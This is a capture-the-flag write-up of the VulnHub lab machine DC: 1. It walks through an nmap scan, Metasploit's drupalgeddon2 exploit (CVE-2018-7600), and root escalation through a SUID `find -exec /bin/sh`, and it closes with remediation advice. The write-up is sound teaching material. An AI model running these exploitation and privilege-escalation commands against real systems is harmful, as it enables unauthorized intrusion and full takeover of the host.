# DC: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.104 (host-only) |
| **Difficulty** | Beginner |
| **OS** | Linux |
| **Root Flag** | /root/thefinalflag.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/dc-1-1,292/) |

## Attack Summary

Drupal 7 on port 80 → Metasploit drupalgeddon2 → Meterpreter shell → SUID `find` binary → root shell.

## Methodology

1. Network discovery and port scan
2. Identify Drupal version on HTTP
3. Exploit drupalgeddon2 (CVE-2018-7600) via Metasploit
4. Enumerate SUID binaries
5. Escalate via SUID `find` -exec

---

## Step 1: Network Discovery

Discover the target on the host-only network:

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
```

Then scan open ports and versions:

```bash
nmap -sV 192.168.1.104
```

Expected output:

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian
80/tcp  open  http    Apache httpd 2.2.22
111/tcp open  rpcbind 2-4 (RPC #100000)
```

![Nmap scan](images/01-nmap.png)

---

## Step 2: Identify Drupal

Browse to `http://192.168.1.104`. A Drupal 7 installation is served on port 80.

![Drupal site](images/02-drupal-site.png)

Drupal 7 is vulnerable to **drupalgeddon2 (CVE-2018-7600)**, an unauthenticated remote code execution vulnerability in the Form API.

---

## Step 3: Exploit drupalgeddon2 (Metasploit)

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.1.104
run
```

A Meterpreter session opens. Drop into a shell and stabilize it:

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Meterpreter shell obtained](images/03-metasploit-shell.png)

---

## Step 4: Enumerate SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

The `find` binary has the SUID bit set — it runs as root regardless of the calling user.

![SUID find discovered](images/04-suid-privesc.png)

---

## Step 5: Privilege Escalation via SUID `find`

Because `find` executes as root, the `-exec` flag can run arbitrary commands as root:

```bash
touch /tmp/raj
find /tmp/raj -exec whoami \;
```

Confirms execution as `root`. Spawn a root shell:

```bash
find /tmp/raj -exec /bin/sh \;
```

Read the final flag:

```bash
cd /root
cat thefinalflag.txt
```

![Root flag](images/05-root-flag.png)

---

## Lessons Learned

1. **Drupalgeddon2 (CVE-2018-7600)** is a critical RCE that affects Drupal 7 < 7.58 — patch immediately and restrict the `update.php` path.
2. **SUID binaries** are a common privesc vector. `find`, `vim`, `less`, `python`, and many others can spawn shells as root when misconfigured.
3. Enumerate SUID files early in every post-exploitation phase: `find / -perm -u=s -type f 2>/dev/null`.

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| drupalgeddon2 (CVE-2018-7600) | Upgrade Drupal to 7.58+ or apply the official patch |
| SUID `find` | Remove the SUID bit: `chmod u-s /usr/bin/find` |
| Outdated Apache/OpenSSH | Apply OS and service patches, restrict SSH to key-only auth |
